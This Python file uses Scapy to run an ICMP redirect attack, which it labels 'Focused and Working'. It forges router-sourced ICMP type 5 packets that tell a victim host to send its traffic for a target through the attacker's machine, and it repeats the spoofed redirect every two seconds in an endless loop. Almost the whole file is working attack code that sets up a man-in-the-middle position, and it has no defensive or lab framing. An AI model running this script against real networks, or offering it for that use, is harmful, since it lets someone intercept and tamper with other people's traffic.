#!/usr/bin/env python3
"""
Simple ICMP Redirect Attack - Focused and Working
"""

from scapy.all import *
import time
import sys

class SimpleICMPRedirect:
    def __init__(self):
        self.victim_ip = "192.168.1.10"
        self.router_ip = "192.168.1.1" 
        self.attacker_ip = "192.168.1.20"
        self.target_ip = "10.0.0.100"
        
    def send_icmp_redirect(self):
        """Send ICMP redirect to victim"""
        try:
            print(f"[*] Crafting ICMP redirect packet...")
            
            # Create the inner IP packet (what victim was trying to send)
            inner_ip = IP(src=self.victim_ip, dst=self.target_ip)
            inner_icmp = ICMP(type=8, code=0, id=0x1234)  # Echo request
            inner_packet = inner_ip / inner_icmp
            
            # Create the ICMP redirect message
            redirect_ip = IP(src=self.router_ip, dst=self.victim_ip)
            redirect_icmp = ICMP(type=5, code=1, gw=self.attacker_ip)  # Host redirect
            
            # Combine: IP header + ICMP redirect + original packet
            redirect_packet = redirect_ip / redirect_icmp / inner_packet
            
            print(f"[*] Sending ICMP redirect...")
            print(f"    From: {self.router_ip} (router)")
            print(f"    To: {self.victim_ip} (victim)")
            print(f"    Message: Use {self.attacker_ip} to reach {self.target_ip}")
            
            # Send the packet
            send(redirect_packet, verbose=False)
            print(f"[+] ICMP redirect sent successfully!")
            
            return True
            
        except Exception as e:
            print(f"[!] Error sending ICMP redirect: {e}")
            return False
    
    def continuous_attack(self):
        """Send redirects continuously"""
        print(f"Starting ICMP Redirect Attack")
        print(f"==============================")
        print(f"Victim: {self.victim_ip}")
        print(f"Router: {self.router_ip}")
        print(f"Attacker: {self.attacker_ip}")
        print(f"Target: {self.target_ip}")
        print()
        
        try:
            count = 0
            while True:
                count += 1
                print(f"[*] Attack round {count}")
                
                if self.send_icmp_redirect():
                    print(f"[+] Round {count} completed successfully")
                else:
                    print(f"[!] Round {count} failed")
                
                print(f"[*] Waiting 2 seconds before next attack...")
                print("-" * 50)
                time.sleep(2)
                
        except KeyboardInterrupt:
            print(f"\n[*] Attack stopped by user after {count} rounds")

def main():
    print("Simple ICMP Redirect Attack")
    print("===========================")
    
    attacker = SimpleICMPRedirect()
    attacker.continuous_attack()

if __name__ == "__main__":
    main()
